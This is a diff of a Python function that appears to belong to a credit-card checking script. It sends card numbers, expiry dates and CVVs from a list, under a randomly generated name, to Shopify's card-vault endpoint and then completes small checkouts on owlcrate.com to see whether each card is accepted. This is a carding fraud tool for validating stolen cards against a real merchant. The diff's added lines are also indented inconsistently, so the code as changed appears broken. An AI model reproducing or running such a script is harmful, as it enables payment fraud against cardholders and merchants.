@@ -111,48 +111,46 @@ def two(s,url,auth_token, rand_user):
 
 def three(r, payment_gateway, lista, rand_user,auth_token, url):
     cc,mes,ano,cvv = lista
-    json_four = {
-    "credit_card": {
-        "number": cc,
-        "name": rand_user.name,
-        "month": mes,
-        "year": ano,
-        "verification_value": cvv
-    },
-    "payment_session_scope": "www.owlcrate.com"
-}
+        json_four = {
+        "credit_card": {
+            "number": cc,
+            "name": rand_user.name,
+            "month": mes,
+            "year": ano,
+            "verification_value": cvv
+        },
+        "payment_session_scope": "www.owlcrate.com"
+    }
 
     four = r.post('https://deposit.us.shopifycs.com/sessions', json = json_four)
     if 'id' not in four.json(): return False
-    headers = {
-  'Host': 'www.owlcrate.com',
-  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
-  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-  'Accept-Language': 'en-US,en;q=0.5',
-  'Referer': 'https://www.owlcrate.com/',
-  'Content-Type': 'application/x-www-form-urlencoded',
-  'Origin': 'https://www.owlcrate.com',
-  'Alt-Used': 'www.owlcrate.com',
-  'Connection': 'keep-alive',
-  'Upgrade-Insecure-Requests': '1',
-  'Sec-Fetch-Dest': 'document',
-  'Sec-Fetch-Mode': 'navigate',
-  'Sec-Fetch-Site': 'same-origin',
-  'Sec-Fetch-User': '?1',
-  'TE': 'trailers'
-}
+        headers = {
+      'Host': 'www.owlcrate.com',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
+      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+      'Accept-Language': 'en-US,en;q=0.5',
+      'Referer': 'https://www.owlcrate.com/',
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'Origin': 'https://www.owlcrate.com',
+      'Alt-Used': 'www.owlcrate.com',
+      'Connection': 'keep-alive',
+      'Upgrade-Insecure-Requests': '1',
+      'Sec-Fetch-Dest': 'document',
+      'Sec-Fetch-Mode': 'navigate',
+      'Sec-Fetch-Site': 'same-origin',
+      'Sec-Fetch-User': '?1',
+      'TE': 'trailers'
+    }
     data = f'_method=patch&authenticity_token={auth_token}&previous_step=payment_method&step=&s={four.json()["id"]}&checkout%5Bpayment_gateway%5D={payment_gateway}&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=624&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1042&checkout%5Bclient_details%5D%5Bbrowser_height%5D=739&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330'
     g = r.post(url, data = data, headers = headers)
     time.sleep(4)
     if g.status_code != 200:
         return False
-    h = r.get(g.url + '?from_processing_page=1')
+    h = r.get(f'{g.url}?from_processing_page=1')
     if h.status_code != 200:
         return False
-    i = r.get(h.url + '&validate=true')
-    if i.status_code != 200:
-        return False
-    return i.text
+    i = r.get(f'{h.url}&validate=true')
+    return False if i.status_code != 200 else i.text
 
 
 
